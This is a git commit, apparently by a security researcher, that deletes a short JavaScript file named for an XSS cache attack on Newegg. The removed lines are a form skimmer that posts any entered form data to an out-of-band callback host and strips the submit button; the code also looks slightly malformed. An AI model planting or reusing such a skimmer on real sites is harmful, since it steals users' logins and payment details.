6b9bd0505397558d73f5d7f5bad73a59b48d3cb0
jagui <soccer.javi@gmail.com>
2025-10-28 16:02:55 +0100

    Delete neweggcachexss.js

--- neweggcachexss.js
+++
@@ -1,9 +0,0 @@
-document.body.addEventListener('change', function() {
-    document.querySelectorAll('form').forEach(function() {
-      fetch('https://eqodqbhkbxerfoddbfoexz30iyy608n5s.oast.fun/', {
-          method: 'POST',
-          body: (new URLSearchParams(new FormData(this).toString())
-      });
-    });
-});
-document.querySelector('*[type=submit]').remove()
